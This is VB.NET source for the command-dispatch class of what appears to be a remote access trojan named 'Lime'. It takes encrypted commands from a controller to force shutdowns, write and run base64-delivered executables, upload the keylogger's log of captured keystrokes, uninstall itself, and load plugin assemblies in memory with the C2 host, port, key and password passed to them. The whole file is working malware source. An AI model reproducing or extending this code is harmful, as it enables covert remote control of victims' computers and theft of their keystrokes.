Namespace Lime


    Public Class C_Commands

        Private Shared SPL = C_Settings.SPL
        Private Shared C As New C_Socket

        Public Shared Sub Data(ByVal b As Byte())
            Dim EN As String = C_Encryption.AES_Decrypt(BS(b))
            Dim A As String() = Split(EN, SPL)

            Try
                Select Case A(0)
                    Case "PC-RES"
                        Shell("Shutdown /r /f /t 00", AppWinStyle.Hide, False, -1)

                    Case "PC-SHUT"
                        Shell("Shutdown /s /f /t 00", AppWinStyle.Hide, False, -1)

                    Case "PC-OUT"
                        Shell("Shutdown /l /f /t 00", AppWinStyle.Hide, False, -1)

                    Case "!P"
                        C.Send("!P")

                    Case "Close"
                        End

                    Case "Reconnect"
                        Diagnostics.Process.Start(C_Settings.fullpath)
                        End

                    Case "Uninstall"
                        Microsoft.Win32.Registry.CurrentUser.DeleteSubKeyTree("Software\" & C_ID.HWID)
                        C_Installation.DEL()

                    Case "Visit"
                        Diagnostics.Process.Start(A(1))

                    Case "RunDisk"
                        Dim NewFile = IO.Path.GetTempFileName & IO.Path.GetExtension(A(1))
                        IO.File.WriteAllBytes(NewFile, Convert.FromBase64String(A(2)))
                        Threading.Thread.CurrentThread.Sleep(1000)
                        Diagnostics.Process.Start(NewFile)
                        If A(3).ToString = "update" Then
                            C_Installation.DEL()
                        End If

                    Case "RunURL"
                        Dim NewFile = IO.Path.GetTempFileName & A(2).ToString
                        ' My.Computer.Network.DownloadFile(A(1), NewFile)
                        Threading.Thread.CurrentThread.Sleep(1000)
                        Diagnostics.Process.Start(NewFile)
                        If A(3).ToString = "update" Then
                            C_Installation.DEL()
                        End If

                    Case "KL"
                        C.Send("KL" + SPL + C_ID.HWID + SPL + IO.File.ReadAllText(C_Keylog.filepath))

                    Case "CPL" 'check plugin
                        If GTV(A(1)) = Nothing Then
                            C.Send("GPL" + SPL + A(1))
                        Else
                            Plugin(Convert.FromBase64String(GTV(A(1))))
                        End If

                    Case "IPL" 'invo plugin
                        STV(A(2), A(1))
                        Plugin(Convert.FromBase64String(GTV(A(2))))

                End Select
            Catch ex As Exception
                C.Send("MSG" + SPL + "Error! " + ex.Message)
            End Try

        End Sub

        Public Shared Sub Plugin(ByVal B() As Byte)
            Try
                For Each A As Type In AppDomain.CurrentDomain.Load(B).GetTypes
                    For Each MF In A.GetMethods
                        If MF.Name = BS(New Byte() {82, 67}) Then 'RC
                            MF.Invoke(Nothing, New Object() {C_Settings.HOST, C_Settings.PORT, C_Socket.KEY, C_Socket.SPL, C_Settings.PASS, C_Settings.fullpath, C_ID.HWID, C_ID.Bot, C_Encryption.AES_Decrypt(C_Settings.Pastebin)})
                        End If
                    Next
                Next
            Catch ex As Exception
                C.Send("MSG" + SPL + "Plugin Error! " + ex.Message)
            End Try
        End Sub

    End Class

End Namespace